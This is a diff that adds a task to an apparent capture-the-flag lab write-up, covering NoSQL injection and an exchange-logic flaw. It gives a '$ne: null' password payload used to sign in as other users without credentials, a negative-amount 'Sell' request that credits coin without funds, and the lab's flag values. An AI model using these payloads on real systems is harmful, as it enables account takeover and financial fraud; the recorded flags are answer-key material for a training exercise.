@@ -101,3 +101,26 @@ logging in as the first matching user without valid credentials.
 {"status":"success","message":"Congratulations For your Sign in!\nFLAG: 56c48f5ae9ab0ffaaafb2a28d4999341"}
 
 **Flag:** 56c48f5ae9ab0ffaaafb2a28d4999341
+
+## Task 7 - NoSQL Enumeration & Exchange Exploit
+
+**Step 1 - Enumerate users via NoSQL login bypass:**
+For each known username, sign in with {"username": "<name>", "password": {"$ne": null}}
+Then call GET /api/a3/nosql_injection/user_info with the session cookie to check wallet balance.
+Best candidates: abdou ($5465.29 total), ismail ($5438.98 total) - still far short of 1 HBTNc ($133,176.80)
+
+**Step 2 - Exploit exchange logic flaw:**
+Normal buy of 1 HBTNc fails: {"coin":"HBTNc","amount":1,"action":"Buy"} -> "Insufficient Balance."
+
+Bypass by using a negative amount with "Sell" action (balance check `amount <= wallet.amount`
+is trivially satisfied by negative numbers, and the resulting subtraction adds HBTNc instead):
+POST /api/a3/nosql_injection/exchange
+{"coin":"HBTNc","amount":-1,"action":"Sell"}
+-> "Successful Exchange: -1.0 HBTNc => -131613.97679999997 USD"
+(USD balance goes deeply negative but is not validated; HBTNc balance increases by 1)
+
+**Step 3 - Retrieve flag:**
+GET /api/a3/nosql_injection/user_info (with abdou's session)
+-> "flag": "Congratulations For your Exchange!\nFLAG: e75b6d2443e425683581d8b2db9de1f5"
+
+**Flag:** e75b6d2443e425683581d8b2db9de1f5
